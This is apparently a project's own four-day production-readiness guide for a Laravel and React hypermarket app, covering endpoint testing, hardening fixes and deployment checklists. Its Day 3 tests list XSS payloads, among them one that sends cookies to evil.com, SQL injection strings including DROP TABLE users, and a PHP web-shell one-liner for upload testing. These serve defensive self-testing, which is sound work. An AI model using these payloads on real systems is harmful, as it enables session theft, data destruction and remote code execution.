# ElBaraka Hypermarket — Production Testing & Security Guide

## 4-Day Production Readiness Plan

> **You have 4 days. This guide tells you EXACTLY what to do each day, what tools to install, how to test everything, and how to secure every endpoint. Follow it step by step.**

---

## Table of Contents

1. [Tools to Install (Do This FIRST)](#1-tools-to-install-do-this-first)
2. [Day 1 — Backend API Testing & Security Hardening](#2-day-1--backend-api-testing--security-hardening)
3. [Day 2 — Frontend App Testing & Admin Dashboard Testing](#3-day-2--frontend-app-testing--admin-dashboard-testing)
4. [Day 3 — Security Audit & Penetration Testing](#4-day-3--security-audit--penetration-testing)
5. [Day 4 — Performance, Deployment & Final Checklist](#5-day-4--performance-deployment--final-checklist)
6. [Complete Security Hardening Checklist](#6-complete-security-hardening-checklist)
7. [All Endpoints Security Audit Table](#7-all-endpoints-security-audit-table)
8. [Environment Variables Checklist](#8-environment-variables-checklist)
9. [Emergency Rollback Plan](#9-emergency-rollback-plan)

---

## 1. Tools to Install (Do This FIRST)

### Desktop Apps to Install

| Tool | What It Does | Download Link | Free? |
|------|-------------|---------------|-------|
| **Postman** | Test ALL your API endpoints (send requests, check responses) | https://www.postman.com/downloads/ | Yes |
| **Insomnia** | Alternative to Postman (lighter, faster) | https://insomnia.rest/download | Yes |
| **OWASP ZAP** | Automatic security scanner — finds vulnerabilities in your API | https://www.zaproxy.org/download/ | Yes |
| **Docker Desktop** | Run your app in containers (same as production) | https://www.docker.com/products/docker-desktop/ | Yes |
| **Git** | Version control (you should already have this) | https://git-scm.com/ | Yes |
| **DBeaver** | Database GUI — inspect your MySQL/PostgreSQL data | https://dbeaver.io/download/ | Yes |
| **Redis Insight** | GUI for Redis cache inspection | https://redis.io/insight/ | Yes |
| **Google Chrome** | For testing + DevTools | You have it | Yes |

### Browser Extensions to Install (Chrome)

| Extension | What It Does |
|-----------|-------------|
| **React Developer Tools** | Inspect React component tree, state, props in admin dashboard |
| **Redux DevTools** | Works with Zustand too — inspect state changes |
| **EditThisCookie** | View/edit cookies (useful for auth debugging) |
| **ModHeader** | Modify HTTP headers (add auth tokens to test protected endpoints) |
| **Lighthouse** | Built into Chrome DevTools — performance & accessibility audit |
| **WAVE Evaluation Tool** | Accessibility checker |
| **JSON Formatter** | Pretty-prints JSON API responses in browser |

### Command Line Tools to Install

```powershell
# Install Node.js (you should already have this)
# Download from https://nodejs.org/ (use LTS version)

# Install PHP tools (for backend testing)
composer global require phpunit/phpunit
composer global require squizlabs/php_codesniffer
composer global require phpstan/phpstan

# Install security scanning tools
npm install -g snyk                     # Finds vulnerabilities in dependencies
npm install -g retire                   # Checks for known vulnerable JS libraries
npm install -g npm-audit-resolver       # Helps fix npm audit issues

# Install API testing tools
npm install -g newman                   # Run Postman collections from command line
npm install -g artillery               # Load/performance testing

# Install mobile testing
npm install -g expo-cli                 # You should already have this
npm install -g eas-cli                  # For building production APK/AAB
```

### VS Code Extensions to Install

| Extension | Publisher | Why |
|-----------|-----------|-----|
| **Thunder Client** | rangav | Test APIs directly inside VS Code |
| **REST Client** | Humao | Send HTTP requests from `.http` files |
| **Error Lens** | usernamehw | See errors inline in code |
| **ESLint** | Microsoft | JavaScript/TypeScript linting |
| **PHP Intelephense** | Ben Mewburn | PHP code intelligence |
| **SQLTools** | Matheus Teixeira | Database queries inside VS Code |
| **GitLens** | GitKraken | Git history and blame |
| **dotenv** | mikestead | Syntax highlighting for .env files |

---

## 2. Day 1 — Backend API Testing & Security Hardening

### Step 1: Set Up Your Testing Environment

```powershell
# Navigate to backend
cd d:\elbarakkaaaaa\unibackend

# Install dependencies
composer install

# Copy .env (if not done)
# Create .env from your production config — see Section 8 for all required variables

# Run migrations
php artisan migrate

# Seed database (if you have seeders)
php artisan db:seed

# Start the server
php artisan serve
```

### Step 2: Test All Public Endpoints with Postman

> **How to use Postman:** Open Postman → Click "New" → "HTTP Request" → Enter URL → Click "Send"

#### Health Check (Test these first — if they fail, your server is broken)

```
GET http://localhost:8000/api/health
Expected: 200 OK, {"status": "ok"}

GET http://localhost:8000/api/health/detailed
Expected: 200 OK with database, cache, storage status

GET http://localhost:8000/api/health/metrics
Expected: 200 OK with performance metrics
```

#### Authentication Flow (Test the COMPLETE flow)

```
# 1. Register a new user
POST http://localhost:8000/api/v1/auth/register
Headers: Content-Type: application/json, Accept: application/json
Body (raw JSON):
{
    "name": "Test User",
    "email": "test@example.com",
    "password": "TestPass123!",
    "password_confirmation": "TestPass123!",
    "phone": "+201234567890"
}
Expected: 201 Created

# 2. Verify Email (check your email/logs for OTP code)
POST http://localhost:8000/api/v1/auth/verify-email
Body:
{
    "email": "test@example.com",
    "otp": "123456"
}
Expected: 200 OK

# 3. Login
POST http://localhost:8000/api/v1/auth/login
Body:
{
    "email": "test@example.com",
    "password": "TestPass123!"
}
Expected: 200 OK with { "token": "...", "refresh_token": "..." }
>>> COPY THE TOKEN — you need it for all protected endpoints

# 4. Test protected endpoint WITH token
GET http://localhost:8000/api/v1/profile
Headers: Authorization: Bearer YOUR_TOKEN_HERE
Expected: 200 OK with user data

# 5. Test protected endpoint WITHOUT token (should fail)
GET http://localhost:8000/api/v1/profile
(no Authorization header)
Expected: 401 Unauthorized
```

#### Products & Categories (Public — should work without auth)

```
GET http://localhost:8000/api/v1/products
GET http://localhost:8000/api/v1/products/featured
GET http://localhost:8000/api/v1/categories
GET http://localhost:8000/api/v1/categories/featured-with-products
GET http://localhost:8000/api/v1/promotions
GET http://localhost:8000/api/v1/offers
```

#### Cart Operations (Test with real product IDs from your database)

```
POST http://localhost:8000/api/v1/cart/add
Body: { "product_id": 1, "quantity": 2 }

GET http://localhost:8000/api/v1/cart

PUT http://localhost:8000/api/v1/cart/update
Body: { "product_id": 1, "quantity": 5 }

DELETE http://localhost:8000/api/v1/cart/remove
Body: { "product_id": 1 }
```

#### Orders (Protected — need auth token)

```
GET http://localhost:8000/api/v1/orders
Headers: Authorization: Bearer YOUR_TOKEN

POST http://localhost:8000/api/v1/orders
(with full order payload)

GET http://localhost:8000/api/v1/orders/1
GET http://localhost:8000/api/v1/orders/1/tracking
```

#### Admin Endpoints (Need admin token)

```
# Login as admin first, then:
GET http://localhost:8000/api/v1/admin/analytics/dashboard
GET http://localhost:8000/api/v1/admin/orders
GET http://localhost:8000/api/v1/admin/products
GET http://localhost:8000/api/v1/admin/customers
GET http://localhost:8000/api/v1/admin/support
```

### Step 3: Automated Backend Tests

Create and run automated tests:

```powershell
# Run existing tests
cd d:\elbarakkaaaaa\unibackend
php artisan test

# Run with verbose output
php artisan test --verbose

# Run specific test suites
php artisan test --testsuite=Feature
php artisan test --testsuite=Unit
```

### Step 4: Backend Security Fixes to Make TODAY

#### Fix 1: Reduce Token Expiration (CRITICAL)

Your tokens last **180 days** — that's WAY too long. A stolen token gives 6 months of access.

Open `config/sanctum.php`:
```php
// CHANGE THIS:
'expiration' => 259200, // 180 days — TOO LONG

// TO THIS:
'expiration' => 10080, // 7 days (7 * 24 * 60 minutes)
```

Your frontend already handles token refresh, so shorter tokens are fine.

#### Fix 2: Add CORS Configuration (CRITICAL)

You don't have a `config/cors.php` file. Your CORS is handled in SecurityHeaders middleware but you need proper config.

Create `config/cors.php`:
```php
<?php
return [
    'paths' => ['api/*', 'sanctum/csrf-cookie', 'broadcasting/auth'],
    'allowed_methods' => ['*'],
    'allowed_origins' => [
        env('FRONTEND_URL', 'https://your-production-domain.com'),
        env('ADMIN_URL', 'https://admin.your-production-domain.com'),
    ],
    'allowed_origins_patterns' => [],
    'allowed_headers' => ['*'],
    'exposed_headers' => [],
    'max_age' => 0,
    'supports_credentials' => true,
];
```

**NEVER use `'*'` for allowed_origins in production.**

#### Fix 3: Update Sanctum Stateful Domains

Open `config/sanctum.php`:
```php
// CHANGE THIS (remove localhost for production):
'stateful' => explode(',', env('SANCTUM_STATEFUL_DOMAINS', sprintf(
    '%s%s',
    'localhost,localhost:3000,127.0.0.1,127.0.0.1:8000,::1',
    ...
))),

// In your .env for PRODUCTION, set:
// SANCTUM_STATEFUL_DOMAINS=your-production-domain.com,admin.your-production-domain.com
```

#### Fix 4: Rate Limiting Hardening

Your current rate limits are decent but some need tightening. Check `bootstrap/app.php` or `RouteServiceProvider`:

```php
// These are good:
// - 60 req/min for general API
// - 10 req/min for social auth  
// - 5 req/min for email changes

// ADD these stricter limits:
// Login: 5 attempts per minute (prevent brute force)
// Register: 3 per minute
// Forgot password: 3 per minute
// OTP verification: 5 per minute
```

#### Fix 5: Validate ALL Input (CRITICAL)

Check every controller has proper validation. Open each controller and verify `$request->validate()` is present. Look for:

```php
// GOOD - Input is validated
$request->validate([
    'email' => 'required|email',
    'password' => 'required|min:8',
]);

// BAD - No validation (security hole!)
$user = User::where('email', $request->email)->first();
```

#### Fix 6: SQL Injection Protection

Laravel's Eloquent ORM protects against SQL injection by default, BUT check for raw queries:

```powershell
# Search for raw SQL queries in your backend
cd d:\elbarakkaaaaa\unibackend
# Search for: DB::raw, DB::select, DB::statement, whereRaw, selectRaw
findstr /s /n "DB::raw\|whereRaw\|selectRaw\|DB::select\|DB::statement" app\*.php
```

If you find any raw queries, make sure they use parameter binding:
```php
// BAD (SQL injection vulnerability):
DB::select("SELECT * FROM users WHERE email = '$email'");

// GOOD (parameterized):
DB::select("SELECT * FROM users WHERE email = ?", [$email]);
```

#### Fix 7: Add .env Production Settings

```env
# REQUIRED for production
APP_ENV=production
APP_DEBUG=false          # CRITICAL — never true in production!
APP_URL=https://your-domain.com

# Security
SESSION_SECURE_COOKIE=true
SESSION_SAME_SITE=strict

# Database
DB_CONNECTION=mysql
DB_HOST=your-production-db-host
DB_PORT=3306
DB_DATABASE=elbaraka_prod
DB_USERNAME=your-db-user
DB_PASSWORD=strong-random-password-here

# CORS
SANCTUM_STATEFUL_DOMAINS=your-domain.com,admin.your-domain.com

# Mail (for OTP)
MAIL_MAILER=smtp
MAIL_HOST=your-smtp-host
MAIL_PORT=587
MAIL_USERNAME=your-email
MAIL_PASSWORD=your-email-password
MAIL_ENCRYPTION=tls

# Paymob (payment gateway)
PAYMOB_API_KEY=your-live-key
PAYMOB_SECRET_KEY=your-live-secret
PAYMOB_HMAC_SECRET=your-hmac-secret

# Cloudinary (images)
CLOUDINARY_URL=your-cloudinary-url

# Redis (caching)
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=strong-redis-password
REDIS_PORT=6379
```

---

## 3. Day 2 — Frontend App Testing & Admin Dashboard Testing

### Frontend Mobile App Testing

#### How to Build & Test the APK

```powershell
cd d:\elbarakkaaaaa\frontend

# Install dependencies
npm install

# Build development APK for testing
npx eas build --profile development --platform android

# OR build preview APK (closer to production)
npx eas build --profile preview --platform android

# For production build
npx eas build --profile production --platform android
```

#### Manual Testing Checklist — Mobile App

Test EVERY screen on a REAL Android device (or emulator). Go through each flow completely:

##### Authentication Flow
- [ ] Open app → See onboarding screens → Complete onboarding
- [ ] Tap "Sign Up" → Fill form → Submit → Receive OTP email
- [ ] Enter OTP → Account verified → Redirected to home
- [ ] Log out → Log in with same credentials → Success
- [ ] Try wrong password → See error message → Not logged in
- [ ] Try "Forgot Password" → Enter email → Receive OTP → Reset password → Log in with new password
- [ ] Try Google Sign-In → Authenticate → Logged in
- [ ] Try Apple Sign-In (iOS only) → Authenticate → Logged in
- [ ] Close app → Reopen → Still logged in (token persisted)
- [ ] Wait for token to expire → App auto-refreshes token

##### Home Screen & Browse
- [ ] Home loads with products, categories, banners
- [ ] Pull to refresh works
- [ ] Tap a category → See products in that category
- [ ] Tap a product → See product detail (images, price, description, reviews)
- [ ] Search for a product → Results appear → Tap result → Opens detail

##### Cart & Checkout
- [ ] Add product to cart → Badge updates → Go to cart
- [ ] Change quantity → Price updates
- [ ] Remove item → Cart updates
- [ ] Apply promo code → Discount applied
- [ ] Invalid promo code → Error message shown
- [ ] Proceed to checkout → Select address
- [ ] Add new address → Saved → Selectable
- [ ] Select delivery slot
- [ ] Select payment method (Cash on Delivery)
- [ ] Place order → Success screen shown
- [ ] Check order in "Orders" tab → Order appears

##### Payment Flow (CRITICAL — test with Paymob test cards)
- [ ] Select card payment → Paymob WebView opens
- [ ] Enter test card: `5123456789012346` (Mastercard test)
- [ ] 3DS challenge appears → Complete it
- [ ] Payment succeeds → Order confirmed
- [ ] Payment fails → Error shown → Can retry
- [ ] App crash during payment → Reopen → Payment recovery works

##### Orders
- [ ] View all orders → Sorted by date
- [ ] Tap order → See full detail (items, total, status, address)
- [ ] Track order → See status updates
- [ ] Cancel order (if eligible) → Refund processed
- [ ] Reorder → Cart filled with same items
- [ ] Download invoice (PDF)

##### Profile & Settings
- [ ] View profile → All info correct
- [ ] Edit name/phone → Saved
- [ ] Upload avatar → Shows new image
- [ ] Change password → Log out → Log in with new password
- [ ] Manage addresses → Add/Edit/Delete/Set default
- [ ] Manage payment methods → View saved cards
- [ ] View favorites → Remove from favorites
- [ ] Notification preferences → Toggle on/off
- [ ] View wallet balance → Transaction history

##### Complaints
- [ ] Submit new complaint → Attached to order
- [ ] View complaint → See messages
- [ ] Send message in complaint → Received by admin

##### Edge Cases to Test
- [ ] Turn off internet → Appropriate error messages shown
- [ ] Turn internet back on → App recovers
- [ ] Very slow internet (use Android dev tools → throttle to 3G)
- [ ] Break the deep link: open `elbaraka://product/1` in browser
- [ ] Rotate device (should stay portrait)
- [ ] Press back button rapidly
- [ ] Background app → Return → Still works
- [ ] Fill cart → Log out → Log back in → Cart should persist (server-side)

### Admin Dashboard Testing

```powershell
cd "d:\elbarakkaaaaa\admindash frontend"

# Install dependencies
npm install

# Start dev server
npm run dev
# Opens at http://localhost:3000
```

#### Manual Testing Checklist — Admin Dashboard

##### Login & Auth
- [ ] Go to http://localhost:3000 → Redirected to /login
- [ ] Enter admin credentials → Login success → Dashboard loads
- [ ] Try wrong password → Error shown
- [ ] Close tab → Reopen → Still logged in (token persisted)
- [ ] Token expires → Auto-refresh happens → No interruption
- [ ] Token refresh fails → Redirected to login

##### Dashboard
- [ ] KPIs load (today's orders, revenue, customers)
- [ ] Charts render with data
- [ ] Recent orders list populated

##### Products Management
- [ ] View all products → Paginated list
- [ ] Create new product → Fill all fields → Upload images → Save
- [ ] Edit product → Change price/stock → Save → Verify changes
- [ ] Delete product → Confirm dialog → Product removed
- [ ] Bulk stock update → Select multiple → Update stock
- [ ] Search/filter products → Results correct

##### Categories Management
- [ ] View category tree
- [ ] Create category → With image → Save
- [ ] Edit category → Change name → Save
- [ ] Delete category (with no products) → Success
- [ ] Reorder categories → New order saved

##### Order Management
- [ ] View all orders → Filter by status, date, payment
- [ ] Click order → Full detail view
- [ ] Update order status → Status changes → Customer gets notification
- [ ] Assign driver → Driver receives order
- [ ] Print receipt → Opens printable view
- [ ] Process refund → Amount correct → Customer wallet credited

##### Customer Management
- [ ] View customer list → Search by name/email
- [ ] Click customer → See order history, complaints, addresses
- [ ] Add customer note → Saved
- [ ] Reset customer password

##### Support Tickets
- [ ] View all tickets → Filter by status/priority
- [ ] Click ticket → See conversation
- [ ] Reply to ticket → Customer sees response
- [ ] Change priority/status → Updated
- [ ] Use canned response → Text inserted
- [ ] View support analytics → Charts render

##### Financial Dashboard
- [ ] Revenue overview loads → Numbers match database
- [ ] Filter by date range → Data updates
- [ ] Export to PDF → File downloads → Content readable
- [ ] Export to Excel → File downloads → Data correct
- [ ] Promo code analytics → Usage data shown

##### Promotions & Promo Codes
- [ ] Create promotion → Set dates, discount, products → Save
- [ ] Create promo code → Set rules, limits → Save
- [ ] Test BOGO rules → Correct items selected
- [ ] View analytics → ROI, conversion shown

##### Delivery Zones
- [ ] View map → All zones shown as polygons
- [ ] Create zone → Draw polygon on map → Set fee → Save
- [ ] Edit zone → Modify polygon → Save
- [ ] Delete zone → Removed from map
- [ ] Set surge pricing → Applied correctly

##### Drivers
- [ ] View all drivers → With status (online/offline)
- [ ] Create driver account → All fields required
- [ ] Assign zone → Driver Limited to zone
- [ ] View performance → Stats accurate

##### Settings
- [ ] View store settings → Working hours, general settings
- [ ] Toggle store closed → Store shows as closed to customers
- [ ] Update working hours → Saved

##### Content (CMS)
- [ ] Edit Terms & Conditions → Save → Check frontend shows new content
- [ ] Edit Privacy Policy → Save → Verify
- [ ] Test bilingual (EN/AR) → Both languages work

##### Reviews
- [ ] View all reviews → Filter by rating
- [ ] Approve review → Shows on product page
- [ ] Reject review → Hidden from product page
- [ ] Reply to review → Response visible

##### Activity & Admin Logs
- [ ] View activity logs → Filtered by action type
- [ ] View admin logs → See who changed what, old/new values
- [ ] Export logs → Data correct

##### Analytics
- [ ] Comprehensive analytics loads → All charts render
- [ ] Date range filter works
- [ ] Sales trends accurate
- [ ] Customer cohort data shown
- [ ] Product performance ranked

##### Role-Based Access (test with different admin roles)
- [ ] Login as `super_admin` → See all menu items
- [ ] Login as `sales_manager` → Only see allowed pages
- [ ] Login as `customer_support` → Only see support + customers
- [ ] Login as `accountant` → Only see financial + analytics
- [ ] Try accessing unauthorized page via URL → Rejected

---

## 4. Day 3 — Security Audit & Penetration Testing

### Step 1: Automated Security Scanning with OWASP ZAP

```
1. Download and install OWASP ZAP from https://www.zaproxy.org/download/
2. Open ZAP
3. Click "Automated Scan"
4. Enter your backend URL: http://localhost:8000
5. Click "Attack"
6. Wait 15-30 minutes
7. Review all found vulnerabilities
8. Fix HIGH and CRITICAL issues immediately
```

**What ZAP checks for:**
- SQL Injection
- Cross-Site Scripting (XSS)
- Broken Authentication
- Security Misconfigurations
- Sensitive Data Exposure
- Missing Security Headers

### Step 2: Dependency Vulnerability Scanning

```powershell
# Backend PHP dependencies
cd d:\elbarakkaaaaa\unibackend
composer audit

# Frontend dependencies
cd d:\elbarakkaaaaa\frontend
npm audit
npm audit fix

# Admin dashboard dependencies
cd "d:\elbarakkaaaaa\admindash frontend"
npm audit
npm audit fix

# Deep scan with Snyk (more thorough than npm audit)
snyk test --all-projects
```

### Step 3: Manual Security Tests YOU Must Do

#### Test 1: Authentication Bypass (5 minutes)

```
# Try accessing protected endpoints without token
GET /api/v1/profile          → Should return 401
GET /api/v1/orders           → Should return 401
GET /api/v1/admin/products   → Should return 401
POST /api/v1/orders          → Should return 401

# Try accessing admin endpoints with regular user token
GET /api/v1/admin/orders     → Should return 403 (Forbidden)
GET /api/v1/admin/customers  → Should return 403
PUT /api/v1/admin/products/1 → Should return 403

# Try accessing driver endpoints with regular user token
GET /api/v1/driver/dashboard → Should return 403
POST /api/v1/driver/accept/1 → Should return 403
```

#### Test 2: IDOR (Insecure Direct Object Reference) (10 minutes)

This is when User A can access User B's data by guessing IDs:

```
# Login as User A (get token A)
# Login as User B (get token B)

# Try to access User B's order with User A's token:
GET /api/v1/orders/USER_B_ORDER_ID
Headers: Authorization: Bearer USER_A_TOKEN
→ Should return 403 or 404 (NOT 200 with data!)

# Try to access User B's address:
GET /api/v1/addresses/USER_B_ADDRESS_ID
Headers: Authorization: Bearer USER_A_TOKEN
→ Should return 403 or 404

# Try to access User B's complaints:
GET /api/v1/complaints/USER_B_COMPLAINT_ID
Headers: Authorization: Bearer USER_A_TOKEN
→ Should return 403 or 404

# Try to cancel User B's order:
POST /api/v1/orders/USER_B_ORDER_ID/cancel
Headers: Authorization: Bearer USER_A_TOKEN
→ Should return 403
```

**If any of these return 200 with another user's data, you have a CRITICAL vulnerability. Fix it immediately by adding ownership checks in the controller:**

```php
// In OrderController@show, for example:
public function show($id) {
    $order = Order::findOrFail($id);
    
    // ADD THIS CHECK:
    if ($order->user_id !== auth()->id()) {
        abort(403, 'Unauthorized');
    }
    
    return response()->json($order);
}
```

#### Test 3: XSS (Cross-Site Scripting) (10 minutes)

Try injecting JavaScript in every text input:

```
# In product name, complaint message, review, profile name, address:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
"><script>document.location='https://evil.com/steal?c='+document.cookie</script>

# If the script executes when you view the page → CRITICAL VULNERABILITY
# The admin dashboard uses DOMPurify, but verify it's applied everywhere
```

#### Test 4: SQL Injection (5 minutes)

```
# Try in search fields, login, anywhere that filters data:
GET /api/v1/products?search=' OR 1=1 --
GET /api/v1/products?search='; DROP TABLE users; --
POST /api/v1/auth/login  Body: {"email": "' OR 1=1 --", "password": "anything"}

# All should return normal error responses, NOT database errors
# If you see SQL error messages → CRITICAL VULNERABILITY
```

#### Test 5: Rate Limiting (5 minutes)

```
# Send 100 login requests with wrong password in 1 minute:
# (Use Postman Runner or a simple script)

for i in range(100):
    POST /api/v1/auth/login
    Body: {"email": "test@test.com", "password": "wrong"}

# After 5-10 attempts, should get 429 Too Many Requests
# If you can send unlimited requests → Rate limiting is broken
```

#### Test 6: File Upload Security (5 minutes)

```
# Try uploading non-image files as product images or avatar:
# 1. Create a file called "malicious.php" with content: <?php system($_GET['cmd']); ?>
# 2. Rename it to "malicious.php.jpg"
# 3. Try uploading as avatar or product image

# The server should reject it or strip the PHP code
# If the file uploads and is accessible as PHP → CRITICAL VULNERABILITY
```

#### Test 7: Payment Security (15 minutes)

```
# Try modifying order totals:
POST /api/v1/checkout/process-payment
Body: {
    "order_id": 1,
    "amount": 0.01,    ← Try sending a tiny amount
    "payment_method": "card"
}
# Server should calculate the real total server-side, not trust the client

# Try replaying a payment webhook:
POST /api/v1/paymob/processed
Body: (copy a previous webhook payload)
# Should be rejected if already processed (idempotency check)

# Verify HMAC webhook signature:
# Modify any field in the webhook payload → Should be rejected
```

### Step 4: Check for Sensitive Data Exposure

```powershell
# Check if debug mode is off
cd d:\elbarakkaaaaa\unibackend
findstr "APP_DEBUG" .env
# Must be: APP_DEBUG=false

# Check for hardcoded secrets in code
findstr /s /n "password\|secret\|api_key\|private_key" app\*.php
findstr /s /n "password\|secret\|apiKey\|privateKey" ..\frontend\services\*.ts
findstr /s /n "password\|secret\|apiKey\|privateKey" "..\admindash frontend\src\services\*.ts"

# Check for console.log in production code
findstr /s /n "console.log" ..\frontend\services\*.ts
findstr /s /n "console.log" "..\admindash frontend\src\services\*.ts"
# Remove all console.log statements before production

# Check .gitignore includes sensitive files
type .gitignore
# Must include: .env, vendor/, node_modules/, storage/logs/
```

---

## 5. Day 4 — Performance, Deployment & Final Checklist

### Step 1: Performance Testing

#### Backend Load Testing with Artillery

```powershell
# Install artillery
npm install -g artillery

# Create a test file
```

Create `d:\elbarakkaaaaa\load-test.yml`:
```yaml
config:
  target: "http://localhost:8000"
  phases:
    - duration: 60     # 60 seconds
      arrivalRate: 10   # 10 new users per second
      name: "Normal load"
    - duration: 30
      arrivalRate: 50   # 50 new users per second  
      name: "Spike test"

scenarios:
  - name: "Browse products"
    flow:
      - get:
          url: "/api/v1/products"
      - get:
          url: "/api/v1/categories"
      - get:
          url: "/api/v1/products/featured"

  - name: "User login and browse"
    flow:
      - post:
          url: "/api/v1/auth/login"
          json:
            email: "test@example.com"
            password: "TestPass123!"
          capture:
            json: "$.token"
            as: "token"
      - get:
          url: "/api/v1/profile"
          headers:
            Authorization: "Bearer {{ token }}"
      - get:
          url: "/api/v1/orders"
          headers:
            Authorization: "Bearer {{ token }}"
```

```powershell
# Run load test
artillery run d:\elbarakkaaaaa\load-test.yml

# Look for:
# - Response times > 500ms → Need optimization
# - Error rate > 1% → Something is breaking under load
# - HTTP 429 → Rate limiting is working (good!)
```

#### Frontend Performance (Lighthouse)

```
1. Open Chrome
2. Go to your admin dashboard (http://localhost:3000)
3. Press F12 → DevTools
4. Click "Lighthouse" tab
5. Check: Performance, Accessibility, Best Practices, SEO
6. Click "Analyze page load"
7. Fix anything below 80 score
```

#### Admin Dashboard Build Test

```powershell
cd "d:\elbarakkaaaaa\admindash frontend"

# Build for production
npm run build

# Preview production build
npm run preview

# Check build output size
dir dist
# Total should be < 5MB for acceptable load times
```

### Step 2: Database Optimization

```sql
-- Connect to your database with DBeaver and run:

-- Check for missing indexes on commonly queried columns
SHOW INDEX FROM orders;       -- Should have indexes on: user_id, status, created_at
SHOW INDEX FROM products;     -- Should have indexes on: category_id, barcode, is_active
SHOW INDEX FROM users;        -- Should have indexes on: email, phone, role

-- Add missing indexes:
CREATE INDEX idx_orders_user_status ON orders(user_id, status);
CREATE INDEX idx_orders_created ON orders(created_at);
CREATE INDEX idx_products_active ON products(is_active, created_at);
```

### Step 3: Production Deployment Checklist

#### Laravel Backend Deployment

```powershell
cd d:\elbarakkaaaaa\unibackend

# 1. Optimize for production
php artisan config:cache       # Cache configuration
php artisan route:cache        # Cache routes
php artisan view:cache         # Cache views
php artisan event:cache       # Cache events

# 2. Run migrations on production DB
php artisan migrate --force

# 3. Optimize autoloader
composer install --optimize-autoloader --no-dev

# 4. Set file permissions (Linux server)
# chmod -R 755 storage/
# chmod -R 755 bootstrap/cache/
# chown -R www-data:www-data storage/
# chown -R www-data:www-data bootstrap/cache/

# 5. Generate app key (if not done)
php artisan key:generate

# 6. Clear old caches
php artisan cache:clear
php artisan config:clear
```

#### Admin Dashboard Deployment

```powershell
cd "d:\elbarakkaaaaa\admindash frontend"

# Build production bundle
npm run build

# The dist/ folder is what you deploy to your web server (Nginx/Apache/Vercel/Netlify)
```

#### Mobile App Build

```powershell
cd d:\elbarakkaaaaa\frontend

# Build production APK
npx eas build --profile production --platform android

# Build AAB for Play Store
npx eas build --profile production-aab --platform android
```

### Step 4: Final Pre-Launch Checklist

#### Backend Checklist
- [ ] `APP_DEBUG=false` in production .env
- [ ] `APP_ENV=production` in production .env
- [ ] Strong `APP_KEY` set (32 characters)
- [ ] Database password is strong (20+ characters, mixed case, numbers, symbols)
- [ ] Redis password is set
- [ ] CORS configured with specific domains (no wildcards)
- [ ] Rate limiting is working
- [ ] All admin endpoints require `admin` middleware
- [ ] All driver endpoints require `driver` middleware
- [ ] Paymob webhook HMAC verification is active
- [ ] File upload validation (type, size) is in place
- [ ] No `dd()`, `dump()`, `var_dump()` in code
- [ ] Error pages don't show stack traces
- [ ] Logging is configured (daily rotation, no sensitive data in logs)
- [ ] Queue worker is running for emails/notifications
- [ ] Cron/scheduler is running (`php artisan schedule:run`)
- [ ] SSL certificate installed (HTTPS only)
- [ ] Database backups automated

#### Frontend App Checklist
- [ ] API base URL points to production server (not localhost)
- [ ] Google Sign-In configured with production client IDs
- [ ] Apple Sign-In configured with production credentials
- [ ] Push notification certificates installed
- [ ] Deep links configured for production domain
- [ ] No `console.log` statements in production code
- [ ] App version number updated
- [ ] Splash screen and app icon set
- [ ] Privacy policy URL set in store listing

#### Admin Dashboard Checklist
- [ ] `VITE_API_BASE_URL` points to production API
- [ ] Pusher key is for production
- [ ] Build completes without errors (`npm run build`)
- [ ] HTTPS configured on admin domain
- [ ] Admin URL added to CORS allowed origins

---

## 6. Complete Security Hardening Checklist

### Authentication Security

| # | Check | Status | Fix |
|---|-------|--------|-----|
| 1 | Token expiration < 7 days | ❌ Currently 180 days | Change `config/sanctum.php` → `'expiration' => 10080` |
| 2 | Password requirements enforced | ✅ Check | Verify min length, complexity in `AuthController@register` validation |
| 3 | Brute force protection (login) | ⚠️ 60/min | Tighten to 5/min: `throttle:5,1` on login route |
| 4 | OTP expiration | ✅ Check | Verify OTPs expire after 10 minutes |
| 5 | Account lockout | ❌ Not implemented | Add: lock account after 10 failed login attempts |
| 6 | Refresh token rotation | ✅ Likely | Verify old refresh tokens are revoked on refresh |
| 7 | Token storage security | ⚠️ AsyncStorage | Consider migrating access token to SecureStore on mobile |
| 8 | Social auth token validation | ✅ Server-side | Google JWKS verification, Apple JWT verification |
| 9 | Password change invalidates tokens | ❌ Check | Add `tokens()->delete()` in password change controller |
| 10 | Session fixation protection | ✅ Built-in | Laravel handles this |

### API Security

| # | Check | Fix |
|---|-------|-----|
| 1 | All endpoints force JSON response | ✅ `ForceJsonResponse` middleware |
| 2 | Security headers present | ✅ `SecurityHeaders` middleware |
| 3 | HSTS enabled in production | ✅ In SecurityHeaders |
| 4 | X-Frame-Options: DENY | ✅ In SecurityHeaders |
| 5 | Content-Type-Options: nosniff | ✅ In SecurityHeaders |
| 6 | CORS properly configured | ❌ Fix: Create proper config/cors.php |
| 7 | Rate limiting on all endpoints | ⚠️ Partial — tighten auth endpoints |
| 8 | Input validation on all endpoints | ❌ Audit every controller |
| 9 | SQL injection protection | ✅ Eloquent ORM (check raw queries) |
| 10 | XSS protection | ⚠️ Verify output encoding |

### Data Security

| # | Check | Fix |
|---|-------|-----|
| 1 | Passwords hashed (bcrypt) | ✅ Laravel default |
| 2 | Sensitive data encrypted at rest | ⚠️ Payment tokens should use `encrypt()` |
| 3 | PII logging disabled | ❌ Audit: no emails/phones in logs |
| 4 | Database credentials not hardcoded | ✅ Using .env |
| 5 | API keys not in frontend code | ✅ Check — only public keys client-side |
| 6 | Error messages don't leak info | ❌ Verify: no SQL errors, no stack traces |
| 7 | File upload validation | ❌ Verify: type, size, extension, mime check |
| 8 | PDF/invoice data sanitized | ❌ Verify DomPDF input |

### Payment Security (Paymob)

| # | Check | Fix |
|---|-------|-----|
| 1 | HMAC webhook verification | ✅ Internal verification |
| 2 | Idempotent payment processing | ✅ Idempotency key on orders |
| 3 | Amount calculated server-side | ❌ VERIFY: never trust client amount |
| 4 | Card data never touches server | ✅ Paymob handles PCI |
| 5 | 3DS authentication for cards | ✅ Implemented |
| 6 | Payment callbacks over HTTPS | ❌ Must be HTTPS in production |
| 7 | Refund authorization | ✅ Admin-only with middleware |
| 8 | Cancellation prevents double-refund | ✅ Check idempotency |

### Infrastructure Security

| # | Check | Fix |
|---|-------|-----|
| 1 | HTTPS everywhere | Required for production |
| 2 | SSL certificate valid | Get from Let's Encrypt (free) |
| 3 | Database not publicly accessible | Bind to 127.0.0.1 or VPC |
| 4 | Redis not publicly accessible | Bind to 127.0.0.1 + password |
| 5 | Server firewall configured | Only ports 80, 443, 22 open |
| 6 | SSH key authentication (no passwords) | Disable password SSH |
